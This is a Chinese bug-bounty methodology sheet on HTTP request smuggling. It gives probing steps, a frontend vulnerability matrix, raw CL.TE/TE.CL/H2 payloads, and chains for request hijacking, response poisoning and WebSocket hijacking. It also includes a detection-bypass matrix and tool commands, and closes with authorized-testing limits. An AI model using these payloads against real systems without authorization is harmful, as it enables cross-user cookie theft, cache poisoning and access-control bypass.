# HTTP 请求走私（Request Smuggling / Desync）

> 前置代理（CDN/WAF/Nginx/负载均衡）与后端对 `Content-Length` / `Transfer-Encoding` 解析不一致 → 攻击者把「半包」塞进连接流，劫持/污染下一个用户的请求或响应。成功 desync 即 P1/P0（$5k–$30k），能缓存投毒或跨用户偷 cookie 时上 Critical。

**取材来源**：[MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)（含 Payload 库）、[elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（含 2026 目标适配矩阵）、[SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)；权威公开源 PortSwigger Web Security Academy（James Kettle 系列）。

---

## 1. 触发信号

- 多级架构：CDN/负载均衡/WAF → 源站，前后端各用自己的 HTTP 解析器
- 同一连接发 2 个请求，第 2 个响应「看起来是别的请求的」；偶发 503/502/异常状态码 [本地 src-hunter]
- 代理日志与后端日志请求数对不上 [本地 src-hunter]
- 前端返回 `Server: haproxy`（≤2.4 已知可 CL.TE/TE.CL）、AWS ALB/Cloudflare 等 CDN 头（H2 降级向量）[Claude-BugHunter]
- Burp「HTTP Request Smuggler」扩展 probing 报 desync

## 2. 高频入口点

**类型速览** [本地 src-hunter]：

| 类型 | 前置代理用 | 后端用 |
|---|---|---|
| **CL.TE** | Content-Length | Transfer-Encoding |
| **TE.CL** | Transfer-Encoding | Content-Length |
| **TE.TE** | 都看，但前后对混淆处理不同 | 同 |
| **HTTP/2 → HTTP/1 desync** | h2 | h1 后端 |
| **CL.0** | CL=0 后端忽略 | 后端读 body |

**2026 目标适配矩阵（先指纹前端再投时间）** [Claude-BugHunter]：

| 前端 | CL.TE | TE.CL | H2.CL | H2.TE | 备注 |
|---|---|---|---|---|---|
| Nginx ≥ 1.21 | 否 | 否 | 部分 | 部分 | RFC 严格，CL+TE 直接 400 |
| Caddy 2.x | 否 | 否 | — | — | 默认加固 |
| Envoy ≥ 1.20 | 否 | 否 | 部分 | 部分 | 多数路径加固 |
| HAProxy ≤ 2.4 | 是 | 是 | — | — | 见 CVE-2021-40346 |
| AWS ALB + 特定上游 | 部分 | 部分 | 是 | 是 | 2022-2024 多份付费报告 |
| Cloudflare → S3/Lambda 链 | — | — | 是 | 是 | H2 降级仍可行 |
| 老 F5 BIG-IP / Citrix ADC / Squid 3.x / ATS 老版 | 是 | — | — | — | 厂商公告/披露 |
| 自写 Python/Go 代理 | 是 | 是 | — | — | 常漏 RFC 强制 |

快速指纹：`curl -sI https://target/ | grep -i "Server:"`。Nginx/Caddy/Envoy → 经典 CL/TE 已死，转 H2.CL/H2.TE；HAProxy/CDN → 跑完整矩阵；无 Server 头 → 发一次 `space-before-colon` 探针，不 400 再深挖 [Claude-BugHunter]。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **判断目标拓扑**：有无 CDN/反代、后端类型、是否支持 HTTP/2（`curl -sI --http2`）。
2. **CL.TE 延时探测**：发 `CL + TE: chunked` 请求，后接正常请求看是否超时——后端等 body 余量 → 命中 [Claude-Red]。
3. **TE.CL 延时探测**：反向组合，看延时方向 [Claude-Red]。
4. **确认（差分响应）**：走私一个不完整方法（`G`），第二次响应若出现 `GPOST`/未知方法 → desync 成立 [Claude-Red]。
5. **H2 降级探测**：前端 h2 后端 h1 时用 H2.CL/H2.TE 帧（Burp Smuggler / h2csmuggler / smuggler.py）。
6. **评估利用链**（有授权再推进）：缓存投毒 / 跨用户劫持 / 旁路前端 ACL 访问 `/admin` / WebSocket 劫持。

## 4. Payload 区（每条标注出处）

### 4.1 CL.TE / TE.CL 基础 `[PortSwigger / 本地 src-hunter]`

```http
# CL.TE：前端按 CL 读，后端按 TE 读到 0 结束，剩下 G 进下一请求 [本地 src-hunter]
POST / HTTP/1.1
Host: victim
Content-Length: 6
Transfer-Encoding: chunked

0

G

# CL.TE 确认（PortSwigger 实验室范式）——连发两次，第二次响应出现 GPOST [Claude-Red]
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G

# TE.CL：前端按 TE，后端按 CL=4 只读 5c\r\n，剩下是走私请求 [Claude-Red]
POST / HTTP/1.1
Host: victim
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### 4.2 类型变体 `[本地 src-hunter]`

```http
# TE.TE：一端忽略混淆 TE 头 [本地 src-hunter]
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: x

0

SMUGGLED

# 双 CL：前端取第一个，后端取第二个 [本地 src-hunter]
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Content-Length: 0

test12GET /admin HTTP/1.1

# CL.0：后端忽略 CL 把 POST 当 GET [本地 src-hunter]
POST / HTTP/1.1
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com
```

### 4.3 HTTP/2 降级（现代主向量）`[Claude-Red / Claude-BugHunter]`

```http
# H2.CL：前端 h2、后端 h1，降级时 CL 转换不一致 [Claude-Red]
:method: POST
:path: /
:authority: vulnerable-website.com
content-length: 0
content-length: 44

GET /admin HTTP/1.1
Host: vulnerable-website.com

# H2C 升级走私（h2c upgrade 让前置代理失效）[Claude-Red]
GET / HTTP/1.1
Host: vulnerable-website.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQAAP__

GET /admin HTTP/1.1
Host: vulnerable-website.com
```

> H2 降级是 2024-2026 主流：多数 CDN+源站拓扑前端 h2、后端 h1，帧长头在降级中丢干净。对 CDN 前置目标用发原始 h2 帧的工具（Burp Pro Smuggler、`h2csmuggler`、`smuggler.py`），避免 curl/raw socket 这类纯 HTTP/1.1 客户端 [Claude-BugHunter]。

### 4.4 利用链（仅授权场景）`[Claude-Red / 本地 src-hunter]`

```http
# 请求劫持：大 CL 吞噬下一用户的请求，Cookie 拼进 body [Claude-Red]
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: vulnerable-website.com

# 响应队列投毒：走私一个伪造响应 [Claude-Red]
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 146
Transfer-Encoding: chunked

0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 30

<html>Fake Response</html>

# WebSocket 劫持 [Claude-Red]
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 65
Transfer-Encoding: chunked

0

GET /socket HTTP/1.1
Upgrade: websocket
Connection: Upgrade
```

### 4.5 Bypass 矩阵（TE/CL 混淆）`[本地 src-hunter / Claude-Red]`

| 拦截 | 绕过 |
|---|---|
| 标准 CL/TE 检测 | TE 大小写 `Transfer-encoding` / `transfer-Encoding`；冒号前空格 `Transfer-Encoding : chunked` |
| TE 拦 | 值变形 `chunked,gzip` / `xchunked` / `identity,chunked`；tab/前导空格注入 |
| 标准 chunk 拦 | 0 大小 chunk 后塞数据；chunk 扩展字段 `0;ext="injected"` |
| 多 TE 头 | `Transfer-Encoding: chunked` + `Transfer-encoding: cow`（一端忽略混淆头） |
| 双 CL | `Content-Length: 6` + `Content-Length: 50`（值差异）；冒号前空格 `Content-Length : 0` |
| h2 关闭 | h2c upgrade |

## 5. 工具用法

```bash
# 前端指纹 [Claude-BugHunter]
curl -sI https://target/ | grep -i "Server:"

# Burp 扩展：HTTP Request Smuggler → 右键 Smuggle probe [Claude-BugHunter / 本地 src-hunter]
# 命令行 [本地 src-hunter / Claude-Red]
python3 smuggler.py -u https://target -v                     # defparam/smuggler
http2smugl quirks --target target.com:443
h2csmuggler check https://target.com/ http://localhost       # assetnote/h2csmuggler（H2）

# 手动差分确认：Burp Repeater raw 模式，关闭 "Update Content-Length" [Claude-Red]
```

> 关键纪律：同一连接发 2 个请求，第二个响应反映前一次走私前缀才算数。走私效果必须落到**另一客户端/会话**的请求上（不是自己的跟进请求）——仅自己浏览器里一次时序差异是解析分歧，不是可利用走私 [Claude-BugHunter]。

## 6. 证据要求

**「已确认」必须满足**：延时技术（走私一个带 ~10s/30s 超时的请求，下一正常请求变慢）+ 差分响应（第二次出现 `GPOST`/未知方法）双证；或 H2 降级后 `/admin` 可被走私访问。

**PoC 模板** [本地 src-hunter]：

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0\r\n\r\nG
# 立即第二个请求（同连接）
GET / HTTP/1.1
Host: target.com
→ 第二个响应反映前一次走私的 'G' 前缀
```

**保存物**：完整原始请求（保留 CRLF）、两次响应对比截图、前端/后端日志差异记录、H2 帧抓包（Wireshark 过滤 `h2` 帧）。缓存投毒类报告附缓存命中前后对比（`Age`/`X-Cache` 头）。

**CVSS 参考** [本地 src-hunter]：走私→缓存投毒 8.1 High；走私→旁路鉴权 9.1 Critical；走私→跨用户 8.1 High。

## 7. 合规边界 / 不要做的事

- **禁**：生产上大流量 desync 测试（影响他人请求）。低速、单次验证，只对自己 cache key 演示缓存投毒。
- **禁**：把走私构造的恶意响应缓存到全站共享路径；看到 desync 现象即停，不实际偷取他人 cookie/token。
- **禁**：用走私请求访问 `/admin` 后 dump 数据；证明「能到达内部路径」即可，`GET` 空路径返回即可作证。
- **限**：一次一个连接，不并发轰炸；走私对象只作用于自己的会话/自己的测试账号。
- **脱敏**：若响应混入他人数据（跨用户验证时），立即丢弃，报告只描述现象不留他人 PII/token。
